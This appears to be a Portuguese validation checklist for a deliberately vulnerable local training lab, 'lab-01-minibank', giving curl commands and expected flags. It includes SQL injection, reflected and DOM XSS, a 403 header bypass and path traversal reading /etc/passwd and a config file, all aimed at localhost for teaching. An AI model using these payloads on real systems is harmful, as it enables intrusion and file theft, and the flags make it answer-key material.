# Validacao do Release Candidate

Comandos esperados para validar o `lab-01-minibank`.

```bash
cd ~/ctf-labs
grep -Rho "FLAG{[^}]*}" lab-01-minibank | sort -u
```

```bash
cd ~/ctf-labs/lab-01-minibank
sudo docker compose up --build
```

```bash
curl -i http://localhost:8088
curl -i http://localhost:8088/status
curl -i http://localhost:8088/robots.txt
curl -i http://127.0.0.1:8088/admin/reports
curl -i http://127.0.0.1:8088/admin/reports -H "X-Original-URL: /admin/reports"
curl -i http://localhost:8088/dev.txt
curl -i -X POST http://127.0.0.1:8088/login -d "username=naoexiste" -d "password=teste"
curl -i -X POST http://127.0.0.1:8088/login -d "username=joao" -d "password=errada"
curl -i -X POST http://127.0.0.1:8088/login -d "username=admin' OR '1'='1' -- " -d "password=teste"
curl -i "http://127.0.0.1:8088/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
curl -i "http://localhost:8088/download?file=public-info.txt"
curl -i "http://localhost:8088/download?file=report-q2.txt"
curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
curl -i "http://localhost:8088/download?file=../config/legacy.conf"
```

Validacao manual no navegador para DOM XSS:

```text
http://127.0.0.1:8088/client-tools#msg=<img src=x onerror=alert(1)>
```

Resultados esperados para o login:

- usuario inexistente: `Usuario nao encontrado.`
- usuario existente com senha errada: `Senha invalida.`
- SQL Injection: `302 Found` com `Location: /dashboard`

Resultados esperados para as novas falhas:

- 403 direto: `HTTP/1.1 403 Forbidden`, sem flag
- 403 bypass: retorna `FLAG{403_bypass_capturado}`
- XSS basico: resposta contem o payload refletido e `FLAG{xss_basico_capturado}`
- DOM XSS: validacao no navegador executa o handler do elemento injetado e mostra `FLAG{dom_xss_capturado}`

Resultados esperados para o Path Traversal:

- `/status`: vaza `internal_path=/usr/src/app`
- `public-info.txt`: prova o download normal
- `report-q2.txt`: revela a pista `config` e `legacy.conf`
- `../../../../etc/passwd`: prova leitura fora de `/usr/src/app/files`
- `../config/legacy.conf`: retorna `FLAG{path_traversal_capturada}`
